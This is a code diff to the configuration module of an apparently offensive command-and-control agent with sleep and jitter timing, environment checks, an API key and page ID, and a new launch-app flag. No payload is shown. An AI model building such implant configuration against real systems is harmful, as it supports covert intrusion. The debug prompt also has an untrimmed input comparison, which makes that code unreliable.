@@ -15,8 +15,9 @@ pub const DEFAULT_PARENT_PAGE_ID: &str = "<<PARENT_PAGE_ID>>";
 pub const DEFAULT_SLEEP_INTERVAL: &str = "<<SLEEP>>";
 pub const DEFAULT_JITTER_TIME: &str = "<<JITTER>>";
 pub const DEFAULT_LOG_LEVEL: &str = "<<LOG_LEVEL>>";
-pub const CONFIG_FILE_PATH: &str = "./cfg.json";
+pub const DEFAULT_CONFIG_FILE_PATH: &str = "./cfg.json";
 pub const DEFAULT_ENV_CHECKS: &str = "<<ENV_CHECKS>>";
+pub const DEFAULT_LAUNCH_APP: &str = "<<LAUNCH_APP>>";
 
 /// Enum for ConfigOptions, useful for parsing configs from 
 /// arbitrary data.
@@ -115,10 +116,10 @@ pub fn get_config_options_debug() -> Result<ConfigOptions, Box<dyn Error + Send 
     io::stdout().flush()?;
     stdin.read_line(&mut log_level)?;
 
-    let mut key_username = String::new();
-    println!("[*] Enter username to key off > ");
+    let mut launch_app = String::new();
+    println!("[*] Launch App (Windows/Linux only) (y/n)? > ");
     io::stdout().flush()?;
-    stdin.read_line(&mut key_username)?;
+    stdin.read_line(&mut launch_app)?;
 
     Ok(
         ConfigOptions {
@@ -127,7 +128,10 @@ pub fn get_config_options_debug() -> Result<ConfigOptions, Box<dyn Error + Send 
             parent_page_id: parent_page_id.trim().to_string(),
             api_key: api_key.trim().to_string(),
             config_file_path: config_file_path.trim().to_string(),
-            launch_app: false,
+            launch_app: match launch_app.to_lowercase().as_str() {
+                "y" => true,
+                _   => false
+            },
             log_level: log_level.trim().parse().unwrap(),
             env_checks: Vec::new()
         }
@@ -141,8 +145,8 @@ pub async fn get_config_options() -> Result<ConfigOptions, ConfigError> {
         jitter_time: DEFAULT_JITTER_TIME.parse().unwrap_or_else(|_| 0),
         parent_page_id: DEFAULT_PARENT_PAGE_ID.to_string(),
         api_key: DEFAULT_API_KEY.to_string(),
-        config_file_path: CONFIG_FILE_PATH.to_string(),
-        launch_app: true,
+        config_file_path: DEFAULT_CONFIG_FILE_PATH.to_string(),
+        launch_app: DEFAULT_LAUNCH_APP.parse().unwrap_or_default(),
         log_level: DEFAULT_LOG_LEVEL.parse().unwrap_or_else(|_| 2),
         env_checks: from_str(DEFAULT_ENV_CHECKS).unwrap_or_else(|_| Vec::new())
     };
@@ -152,14 +156,14 @@ pub async fn get_config_options() -> Result<ConfigOptions, ConfigError> {
 
 /// Ingests config from a saved JSON file—or tries to.
 /// 
-/// If `None` is passed as the path, the `CONFIG_FILE_PATH` is attempted.
+/// If `None` is passed as the path, the `DEFAULT_CONFIG_FILE_PATH` is attempted.
 /// 
 /// If no config file can be parsed, defaults are used.
 pub async fn load_config_options(c: Option<&str>) -> Result<ConfigOptions, ConfigError> {
 
     let config_file_path = match c {
         Some(p) => p,
-        None => CONFIG_FILE_PATH
+        None => DEFAULT_CONFIG_FILE_PATH
     };
 
     if let Ok(c) = fs::read_to_string(config_file_path) {
